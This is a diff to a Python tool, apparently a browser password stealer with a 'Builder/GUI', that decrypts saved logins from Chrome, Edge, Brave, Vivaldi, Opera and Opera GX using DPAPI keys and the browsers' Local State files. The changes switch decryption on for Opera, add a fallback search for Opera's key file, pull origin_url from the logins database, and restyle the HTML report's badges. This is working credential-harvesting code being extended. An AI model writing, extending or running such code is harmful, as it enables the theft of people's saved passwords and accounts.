@@ -34,7 +34,7 @@ import multiprocessing
 from pathlib import Path
 from datetime import datetime
 
-__version__ = "2.5.0"
+__version__ = "2.6.0"
 
 # =========================================================================
 # CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
@@ -131,11 +131,13 @@ HTML_TEMPLATE = """
         td:nth-child(3), td:nth-child(4), td:nth-child(5) { word-break: break-all; }
         th { background-color: #3498db; color: white; }
         tr:hover { background-color: #f1f1f1; }
-        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
-        .chrome { background-color: #ffeb3b; color: #333; }
-        .edge { background-color: #03a9f4; color: white; }
-        .brave { background-color: #ff5722; color: white; }
-        .opera { background-color: #f44336; color: white; }
+        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; text-shadow: 0 1px 1px rgba(0,0,0,0.15); display: inline-block; text-align: center; }
+        .chrome { background-color: #fcc117; color: #1e1e1e; }
+        .edge { background-color: #0078d7; color: white; }
+        .brave { background-color: #ff4500; color: white; box-shadow: 0 2px 4px rgba(255, 69, 0, 0.2); }
+        .vivaldi { background-color: #ef382b; color: white; box-shadow: 0 2px 4px rgba(239, 56, 43, 0.25); }
+        .opera { background-color: #cc0f35; color: white; }
+        .opera-gx { background-color: #1a1a1a; color: #ff0055; border: 1px solid #ff0055; box-shadow: 0 0 5px rgba(255, 0, 85, 0.4); font-family: 'Consolas', monospace; }
         .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
         .skipped { color: #aaa; font-style: italic; }
         .actions { margin: 20px 0; text-align: right; }
@@ -279,8 +281,8 @@ class ChromiumDecryptor:
             "Edge":     (self.local   / "Microsoft/Edge/User Data",          True),
             "Brave":    (self.local   / "BraveSoftware/Brave-Browser/User Data", True),
             "Vivaldi":  (self.local   / "Vivaldi/User Data",                 True),
-            "Opera":    (self.roaming / "Opera Software/Opera Stable",       False),
-            "Opera GX": (self.roaming / "Opera Software/Opera GX Stable",   False),
+            "Opera":    (self.roaming / "Opera Software/Opera Stable",       True),
+            "Opera GX": (self.roaming / "Opera Software/Opera GX Stable",   True),
         }
         self.browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
 
@@ -304,6 +306,18 @@ class ChromiumDecryptor:
         dpapi_available = bool(win32crypt)
         keys = {}
         ls = user_data_path / "Local State"
+
+        if not ls.exists():
+            # Fallback robusto para Opera/Opera GX: Si la ruta base está en Roaming, buscar Local State en Local (o viceversa)
+            if "Opera Software" in str(user_data_path):
+                alt_base = Path(str(user_data_path).replace("Roaming", "Local"))
+                if "Local" in str(user_data_path):
+                    alt_base = Path(str(user_data_path).replace("Local", "Roaming"))
+                
+                alt_ls = alt_base / "Local State"
+                if alt_ls.exists():
+                    ls = alt_ls
+                    logger.debug(f"Local State alternativo encontrado para Opera en: {ls}")
 
         if not ls.exists():
             logger.debug(f"Local State no encontrado en: {user_data_path}")
@@ -534,12 +548,16 @@ class ChromiumDecryptor:
                 shutil.copy2(t['db_path'], tmp)
                 conn = sqlite3.connect(tmp)
                 cursor = conn.cursor()
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                cursor.execute("SELECT action_url, username_value, password_value, origin_url FROM logins")
                 rows = cursor.fetchall()
                 log(f"  [{t['name']}] {len(rows)} entradas encontradas.")
 
                 for row in rows:
-                    url, user, blob = row[0], row[1], row[2]
+                    action_url, user, blob, origin_url = row[0], row[1], row[2], row[3]
+                    
+                    # Usar origin_url como fallback si action_url está vacío (común en entradas cargadas manualmente)
+                    url = action_url if action_url else origin_url
+                    
                     # Descarta entradas sin URL o sin usuario (no son credenciales útiles)
                     if not url or not user:
                         continue
